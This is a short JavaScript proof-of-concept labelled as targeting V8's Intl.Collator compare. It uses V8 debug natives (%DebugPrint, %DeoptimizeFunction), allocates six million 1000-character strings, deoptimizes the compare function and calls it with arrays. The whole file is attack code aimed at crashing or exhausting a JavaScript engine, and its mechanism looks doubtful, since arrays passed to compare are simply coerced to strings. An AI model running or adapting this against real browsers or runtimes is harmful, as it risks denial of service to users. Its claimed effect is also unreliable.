(function runPoC() {
  %DebugPrint("Starting Intl.Collator compare PoC");
  // Create a large array of strings
  const largeArray = [];
  const size = 6000000; // 6M strings
  for (let i = 0; i < size; i++) {
    largeArray.push("a".repeat(1000));
  }
  const collator = new Intl.Collator();
  %DeoptimizeFunction(collator.compare);
  // Call the deoptimized compare with the large array
  collator.compare(largeArray, largeArray);
})();
